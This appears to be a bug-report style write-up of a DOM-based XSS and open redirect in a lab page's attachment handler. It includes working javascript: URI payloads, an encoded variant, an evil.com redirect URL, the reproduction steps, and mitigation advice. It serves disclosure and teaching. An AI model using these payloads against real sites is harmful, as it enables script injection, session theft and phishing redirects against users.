# DOM-Based Cross-Site Scripting (XSS) - IQ Card Attachment Handler

## Summary

I identified a DOM-Based Cross-Site Scripting (XSS) vulnerability in the IQ Card Library Attachment Handler.

The application reads the URL query string using `document.location.search` and processes it without proper sanitization or validation. By supplying a `javascript:` URI instead of a legitimate file path, arbitrary JavaScript is executed when the victim visits the crafted URL.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - DOM-Based**

## Vulnerable Parameter

```text
Query String (URL after ?)
```

## Vulnerable URL

```text
https://kzlabs.in/69.php?javascript:alert(document.domain)
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the value of the query string with the following payload:

   ```text
   javascript:alert(document.domain)
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/69.php?javascript:alert(document.domain)
   ```

4. Observe that the browser executes the supplied `javascript:` URI and displays an alert with the document domain.

## Payloads Used

```text
javascript:alert(document.domain)
```

URL-encoded version:
```text
javascript%3Aalert%28document.domain%29
```

Alternative payloads:
```text
javascript:alert(1)
https://evil.com (Open Redirect)
```

## Proof of Concept

The vulnerability is DOM-Based, meaning the malicious payload is processed entirely on the client-side via the URL query string.

The vulnerable JavaScript code:
```javascript
function GetAttach() {
    var strSearch = document.location.search; // e.g. "?javascript:alert(1)"
    // ... strSearch is used without sanitization
}
```

The payload works by:
1. The application reads the URL query string using `document.location.search`
2. The query string value is processed and used for navigation without sanitization
3. When a `javascript:` URI is supplied, the browser executes the JavaScript code
4. The `alert(document.domain)` function executes, displaying the document domain

```javascript
// When the payload is processed:
javascript:alert(document.domain)
```

The source code confirms the vulnerability with comments indicating the exploitation vectors:
```javascript
// Exploit 1 - DOM XSS:
// 69.php?javascript:alert(document.domain)

// Exploit 2 - Open Redirect:
// 69.php?https://evil.com
```

<img width="1919" height="1079" alt="Screenshot 2026-08-14 211311" src="https://github.com/user-attachments/assets/707c40e9-38a8-4d14-8154-78c02b3b4e24" />
<img width="1627" height="512" alt="Screenshot 2026-08-14 211822" src="https://github.com/user-attachments/assets/c7272b61-ebe4-450a-9b96-53e51320e3f8" />


## Impact

DOM-Based XSS vulnerabilities via query string parameters are dangerous because:

- **Client-Side Execution**: Payloads execute in the victim's browser context
- **URL Parameter Injection**: Attackers can craft malicious links and distribute them via email or social media
- **Bypass Server Filters**: Server-side filtering may not detect client-side vulnerabilities
- **Open Redirect**: Can redirect users to malicious websites

An attacker can:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information

## Recommendation

To mitigate this vulnerability:

- **URI Scheme Validation**: Validate the URI scheme and only allow safe protocols such as `http://`, `https://`, and `mailto:`.
  ```javascript
  function isSafeUrl(url) {
      var allowedSchemes = ['http', 'https'];
      try {
          var parsed = new URL(url);
          return allowedSchemes.includes(parsed.protocol.replace(':', ''));
      } catch(e) {
          return false;
      }
  }
  ```

- **Sanitize Input**: Never use unsanitized user input for navigation or DOM manipulation.

- **Input Validation**: Validate and sanitize all user inputs, including query string parameters.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts the use of `javascript:` URIs and inline scripts.

- **Safe Navigation**: Use `window.location.href` only after validating the URL.

- **Web Application Firewall (WAF)**: Deploy a WAF to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.

---
